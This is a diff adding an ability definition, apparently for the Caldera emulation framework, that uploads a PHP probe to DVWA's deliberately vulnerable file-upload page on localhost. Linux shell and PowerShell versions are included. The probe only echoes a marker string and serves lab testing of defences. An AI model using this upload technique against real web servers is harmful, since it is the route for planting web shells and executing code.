@@ -1,0 +1,38 @@
+- id: a1b2c3d4-dvwa-0007-upld-000000000007
+  name: DVWA - File Upload Probe (Low)
+  description: Uploads a diagnostic probe file to DVWA Upload endpoint
+  tactic: lateral-movement
+  technique_id: T1105
+  technique_name: Ingress Tool Transfer
+  repeatable: false
+  executors:
+    - name: sh
+      platform: linux
+      command: |
+        DVWA_URL="${DVWA_URL:-http://127.0.0.1:80/dvwa}"
+        COOKIE_FILE="/tmp/dvwa_cookie.txt"
+        PROBE_FILE="/tmp/caldera_probe.php"
+        echo '<?php echo "DVWA_PROBE_CALDERA_OK"; ?>' > "$PROBE_FILE"
+        curl -s -b "$COOKIE_FILE" -b "security=low" \
+          -F "uploaded=@$PROBE_FILE;type=application/x-php" \
+          -F "Upload=Upload" \
+          "$DVWA_URL/vulnerabilities/upload/" > /dev/null || true
+        rm -f "$PROBE_FILE"
+        echo "[+] Dispatched file upload payload"
+        exit 0
+      timeout: 30
+    - name: psh
+      platform: windows
+      command: |
+        $DvwaUrl = if ($env:DVWA_URL) { $env:DVWA_URL } else { "http://127.0.0.1:80/dvwa" }
+        $CookieFile = "$env:TEMP\dvwa_cookie.txt"
+        $ProbeFile = "$env:TEMP\caldera_probe.php"
+        Set-Content -Path $ProbeFile -Value '<?php echo "DVWA_PROBE_CALDERA_OK"; ?>'
+        curl.exe -s -b "$CookieFile" -b "security=low" `
+          -F "uploaded=@$ProbeFile;type=application/x-php" `
+          -F "Upload=Upload" `
+          "$DvwaUrl/vulnerabilities/upload/" | Out-Null
+        Remove-Item -Path $ProbeFile -ErrorAction SilentlyContinue
+        Write-Output "[+] Dispatched file upload payload"
+        exit 0
+      timeout: 30
